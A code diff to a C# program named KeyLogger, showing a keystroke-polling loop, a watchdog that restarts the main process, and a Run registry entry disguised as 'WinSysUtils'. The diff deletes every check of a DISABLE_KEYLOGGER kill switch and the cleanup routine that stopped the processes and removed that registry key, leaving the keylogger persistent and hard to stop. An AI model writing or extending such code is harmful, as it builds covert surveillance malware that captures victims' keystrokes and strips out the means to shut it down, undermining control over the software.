@@ -30,13 +30,6 @@ namespace KeyLogger
         [STAThread]
         static void Main(String[] args)
         {
-            string disableVar = Environment.GetEnvironmentVariable("DISABLE_KEYLOGGER");
-            if (string.Equals(disableVar, "true", StringComparison.OrdinalIgnoreCase))
-            {
-                CleanupAndExit();
-                return;
-            }
-
             if (args.Contains("--watchdog"))
             {
                 RunWatchdog();
@@ -57,11 +50,6 @@ namespace KeyLogger
                 {
                     Thread.Sleep(2000);
                     
-                    if (string.Equals(Environment.GetEnvironmentVariable("DISABLE_KEYLOGGER"), "true", StringComparison.OrdinalIgnoreCase))
-                    {
-                        CleanupAndExit();
-                    }
-
                     if (!IsWatchdogRunning())
                     {
                         StartWatchdog();
@@ -72,11 +60,6 @@ namespace KeyLogger
             while (true)
             {
                 Thread.Sleep(10);
-
-                if (string.Equals(Environment.GetEnvironmentVariable("DISABLE_KEYLOGGER"), "true", StringComparison.OrdinalIgnoreCase))
-                {
-                    CleanupAndExit();
-                }
 
                 // An even more advanced check
                 bool shift = false;
@@ -241,11 +224,6 @@ namespace KeyLogger
             {
                 Thread.Sleep(1000);
 
-                if (string.Equals(Environment.GetEnvironmentVariable("DISABLE_KEYLOGGER"), "true", StringComparison.OrdinalIgnoreCase))
-                {
-                    CleanupAndExit();
-                }
-
                 if (!IsMainProcessRunning())
                 {
                     try
@@ -255,48 +233,6 @@ namespace KeyLogger
                     catch { }
                 }
             }
-        }
-
-        private static void CleanupAndExit()
-        {
-            try
-            {
-                // 1. Kill all other processes in the install dir
-                int currentPid = Process.GetCurrentProcess().Id;
-                foreach (var process in Process.GetProcesses())
-                {
-                    try
-                    {
-                        if (process.Id == currentPid) continue;
-                        
-                        string fileName = "";
-                        try { fileName = process.MainModule.FileName; } catch { continue; }
-
-                        if (fileName.StartsWith(InstallDir, StringComparison.OrdinalIgnoreCase))
-                        {
-                            process.Kill();
-                            process.WaitForExit(2000);
-                        }
-                    }
-                    catch { }
-                }
-
-                // 2. Remove Registry key
-                try
-                {
-                    using (RegistryKey key = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true))
-                    {
-                        if (key != null && key.GetValue("WinSysUtils") != null)
-                        {
-                            key.DeleteValue("WinSysUtils");
-                        }
-                    }
-                }
-                catch { }
-            }
-            catch { }
-
-            Environment.Exit(0);
         }
 
         private static bool IsMainProcessRunning()
